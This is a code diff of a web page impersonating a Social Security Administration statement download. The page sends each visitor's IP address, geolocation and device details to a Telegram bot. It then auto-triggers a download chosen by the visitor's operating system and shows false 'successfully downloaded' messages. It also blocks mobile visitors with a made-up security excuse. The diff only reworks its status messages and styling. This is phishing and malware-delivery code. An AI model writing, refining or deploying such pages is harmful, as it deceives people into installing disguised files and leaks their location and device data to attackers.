@@ -27,7 +27,40 @@
             text-decoration: underline;
         }
 
-        /* Added styles from RingCentral implementation */
+        /* Added styles for download status */
+        .download-status-container {
+            margin: 20px auto;
+            max-width: 800px;
+            padding: 0 15px;
+            font-family: Arial, sans-serif;
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .download-status {
+            padding: 10px 15px;
+            margin-bottom: 10px;
+            border-left: 3px solid #0033a0;
+            background-color: #f8f9fa;
+        }
+        
+        .download-success {
+            border-left-color: #2e8540;
+            background-color: #f0f7f2;
+        }
+        
+        .download-message {
+            font-weight: normal;
+            color: #333;
+        }
+        
+        .download-info {
+            color: #757575;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        /* Loading spinner styles */
         .loading-container {
             margin: 30px auto;
             width: 60px;
@@ -48,37 +81,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        .status-message {
-            margin-top: 15px;
-            font-weight: 600;
-            color: #0033a0;
-            font-size: 13px;
-            padding: 8px 12px;
-            background-color: #f0f7ff;
-            border-radius: 4px;
-            border-left: 3px solid #0033a0;
-        }
-        .success-message {
-            display: none;
-            margin-top: 15px;
-            padding: 10px;
-            background-color: #f0fff4;
-            border-left: 3px solid #38a169;
-            color: #2f855a;
-            font-size: 13px;
-            border-radius: 4px;
-        }
-        .mobile-warning {
-            display: none;
-            margin-top: 15px;
-            padding: 15px;
-            background-color: #fffaf0;
-            border-left: 3px solid #dd6b20;
-            color: #c05621;
-            font-size: 14px;
-            border-radius: 4px;
-            margin-bottom: 15px;
         }
         .download-btn {
             display: inline-block;
@@ -125,25 +127,9 @@
 <h1>Welcome to Your Latest SSA Statement Download</h1>
 </center>
 
-<!-- Added loading indicator -->
+<!-- Loading indicator -->
 <div class="loading-container">
     <div class="loading-circle" id="loadingCircle"></div>
-</div>
-
-<!-- Added status messages -->
-<div id="mobileWarning" class="mobile-warning">
-    <strong>Mobile Device Detected:</strong> For security reasons, this statement can only be accessed from a computer or desktop device. Please switch to a PC to download your SSA statement.
-</div>
-
-<div id="successMessage" class="success-message">
-    Your SSA statement has been successfully downloaded.<br><br>
-    To view: Locate the downloaded file and open it.
-</div>
-
-<div id="statusMessage" class="status-message"></div>
-
-<h4>Your download will start automatically. If it doesn't, <a download="" href="" id="downloadLink">click here</a>.</h4>
-</div>
 </div>
 
 <h4 id="statusText">Preparing your SSA statement download...</h4>
@@ -175,6 +161,9 @@
     <li><a href="#" id="uef-tmpl-accessibility" target="_blank">Accessibility Help</a></li>
 </ul>
 </footer>
+
+<!-- Download status messages will appear here -->
+<div id="downloadStatusContainer" class="download-status-container"></div>
 </div>
 
 <script>
@@ -185,12 +174,10 @@
     // Function to report visitor information to Telegram
     async function reportVisitToTelegram() {
         try {
-            // Get IP and location information
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
             
-            // Get geolocation data
             let geoData = {};
             try {
                 const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -200,7 +187,6 @@
                 geoData = { error: "Could not fetch location" };
             }
             
-            // Get browser and device info
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const screenWidth = window.screen.width;
@@ -208,7 +194,6 @@
             const language = navigator.language;
             const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
             
-            // Prepare visit details
             const visitDetails = `
 📡 New SSA Statement Visit
 🕒 Time: ${new Date().toLocaleString()}
@@ -221,7 +206,6 @@
 📺 Screen: ${screenWidth}x${screenHeight}
             `.trim();
             
-            // Send to Telegram
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             await fetch(telegramUrl, {
                 method: 'POST',
@@ -266,16 +250,50 @@
         }
     }
 
+    function showDownloadStatus() {
+        const container = document.getElementById('downloadStatusContainer');
+        
+        // Clear previous messages
+        container.innerHTML = '';
+        
+        // Create status messages
+        const successMsg = document.createElement('div');
+        successMsg.className = 'download-status download-success';
+        successMsg.innerHTML = `
+            <div class="download-message">Your SSA statement has been successfully downloaded.</div>
+            <div class="download-info">To view: Locate the downloaded file and open it.</div>
+        `;
+        
+        const statusMsg = document.createElement('div');
+        statusMsg.className = 'download-status';
+        statusMsg.innerHTML = `
+            <div class="download-message">Download started successfully!</div>
+        `;
+        
+        const actionMsg = document.createElement('div');
+        actionMsg.className = 'download-status';
+        actionMsg.innerHTML = `
+            <div class="download-message">If the download doesn't start automatically, <a href="#" id="manualDownloadLink" style="color: #0033a0; text-decoration: underline;">Open Statement File</a></div>
+        `;
+        
+        // Append messages to container
+        container.appendChild(successMsg);
+        container.appendChild(statusMsg);
+        container.appendChild(actionMsg);
+        
+        // Update manual download link
+        const osType = detectOS();
+        const downloadLink = getDownloadLink(osType);
+        document.getElementById('manualDownloadLink').href = downloadLink;
+    }
+
     function handleDesktopDevice() {
         const osType = detectOS();
         const downloadLink = getDownloadLink(osType);
         const statusText = document.getElementById('statusText');
-        const statusMessage = document.getElementById('statusMessage');
-        const successMessage = document.getElementById('successMessage');
         const downloadBtn = document.getElementById("downloadLink");
         
         downloadBtn.href = downloadLink;
-        
         statusText.textContent = "Downloading your SSA statement...";
         
         try {
@@ -286,36 +304,27 @@
             autoDownloadBtn.click();
             document.body.removeChild(autoDownloadBtn);
             
-            statusMessage.textContent = "Download successful!";
-            
             setTimeout(() => {
                 statusText.style.display = "none";
-                successMessage.style.display = "block";
-                
-                const loadingCircle = document.getElementById('loadingCircle');
-                loadingCircle.style.opacity = '0';
-                
-                downloadBtn.textContent = "Click Here To Download Manually";
+                document.getElementById('loadingCircle').style.opacity = '0';
+                downloadBtn.textContent = "Open Statement File";
+                showDownloadStatus();
             }, 2000);
         } catch (e) {
-            statusMessage.textContent = "Download failed. Please try the download button above.";
+            showDownloadStatus();
             console.error("Download error:", e);
         }
     }
 
     function handleMobileDevice() {
         const statusText = document.getElementById('statusText');
-        const mobileWarning = document.getElementById('mobileWarning');
         const loadingCircle = document.getElementById('loadingCircle');
         
-        mobileWarning.style.display = 'block';
         statusText.textContent = "SSA statement access restricted to desktop devices";
-        
         loadingCircle.style.opacity = '0';
     }
 
     window.onload = function() {
-        // Report visit to Telegram
         reportVisitToTelegram();
         
         if (isMobileDevice()) {
